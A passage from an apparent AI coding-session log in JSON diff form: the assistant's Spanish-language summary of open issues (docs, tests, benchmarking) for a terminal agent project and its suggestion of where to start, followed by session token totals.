Autocompletado de paths (duplicada)\n- **#8** Edición de mensajes previos\n\n### Docs & DX (3)\n- **#34** Rotación de logs\n- **#20** README desactualizado\n- **#13** Sistema de memoria/cabinet\n\n### Tests (6)\n- **#30** Session\n- **#29** Context-management\n- **#28** Commands\n- **#27** EditTool\n- **#21** Componentes TUI\n- **#14** Componentes críticos (Runner, OpenRouterProvider)\n\n### Benchmarking (2)\n- **#40** Modo headless\n- **#41** Harness de corrida\n\n---\n\n¿Por dónde arrancamos? Mi sugerencia: **#35 (compaction/poda)** que es el de mayor impacto según `harness-improvements.md`, o si preferís algo rápido para entrar en calor, **#37 (system prompt)** que es literalmente agregar dos líneas de texto."
+        }
+      ]
+    }
+  ],
+  "totalCost": 0,
+  "totalTokens": {
+    "input": 7702463,
+    "output": 85343
+  }
+}
